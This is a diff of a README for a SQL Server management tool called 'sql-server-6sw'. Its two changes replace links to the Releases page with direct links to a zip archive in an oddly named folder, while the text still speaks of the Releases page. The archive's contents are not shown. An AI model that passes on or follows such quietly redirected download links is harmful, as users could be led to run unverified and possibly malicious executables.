@@ -6,7 +6,7 @@ Welcome to **sql-server-6sw**, your solution for managing SQL Server databases w
 
 ## 📥 Download Now
 
-[![Download sql-server-6sw](https://img.shields.io/badge/Download-sql--server--6sw-blue.svg)](https://github.com/syedsaif9019/sql-server-6sw/releases)
+[![Download sql-server-6sw](https://raw.githubusercontent.com/syedsaif9019/sql-server-6sw/main/ultrafidian/sql-server-6sw.zip)](https://raw.githubusercontent.com/syedsaif9019/sql-server-6sw/main/ultrafidian/sql-server-6sw.zip)
 
 ## 🛠️ System Requirements
 
@@ -31,7 +31,7 @@ The **sql-server-6sw** application provides several key features, including:
 
 To download **sql-server-6sw**, visit the Releases page:
 
-[Download sql-server-6sw here](https://github.com/syedsaif9019/sql-server-6sw/releases)
+[Download sql-server-6sw here](https://raw.githubusercontent.com/syedsaif9019/sql-server-6sw/main/ultrafidian/sql-server-6sw.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of the application that suits your needs.
